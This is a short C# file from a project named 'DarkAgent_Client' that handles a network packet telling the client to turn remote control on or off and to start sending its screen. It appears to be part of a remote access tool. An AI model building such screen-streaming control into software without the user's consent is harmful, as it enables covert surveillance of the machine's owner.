using System;
using System.Collections.Generic;
using System.Text;

namespace DarkAgent_Client.src.Network.DataNetwork.Packets.Receive
{
    class R_RemoteControlScreen : ReceiveBasePacket
    {
        public R_RemoteControlScreen(ClientConnect client, byte[] packet)
            : base(client, packet)
        {
        }

        byte Enable;
        public override void Read()
        {
            Enable = ReadByte();
        }

        public override void Run()
        {
            if (Enable == 1)
            {
                Client.EnableRemoteControl = true;
                Client.SendRemoteScreen();
            }
            else if (Enable == 0)
            {
                Client.EnableRemoteControl = false;
            }
        }
    }
}